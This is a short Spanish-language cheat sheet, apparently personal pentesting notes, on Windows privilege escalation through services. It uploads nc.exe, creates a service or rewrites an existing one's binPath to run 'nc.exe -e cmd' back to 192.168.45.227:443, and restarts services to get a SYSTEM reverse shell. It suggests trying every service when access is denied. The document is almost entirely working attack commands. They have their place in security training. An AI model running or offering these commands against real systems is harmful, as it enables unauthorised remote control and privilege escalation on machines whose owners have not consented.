
# ENUMERAR SERVICIOS
```shell
services
```

# ESCALADA
```shell
#SUBIR BINARIO DE NC
upload ../../../../../../usr/share/windows-resources/binaries/nc.exe

#CREAR UN SERVICIO
sc.exe create reverse binPath="C:\Windows\Temp\nc.exe -e cmd 192.168.45.227 443"

#ARRANCAR UN SERVICIO
sc.exe stop VMTools #PARAR
sc.exe start VMTools #ARRANCAR

#EN CASO DE ACCESO DENEGADO PODEMOS PROBAR A MODIFICAR UNO YA EXISTENTE
sc.exe config WMPNetworkSvc binPath="C:\Windows\Temp\nc.exe -e cmd 192.168.45.227 443" 
#Cambiar esto por el nombre del servicio que queramos. WMPNetworkSvc
#SI VUELVE A DAR ACCESO DENEGADO PROBAR CON TODOS
```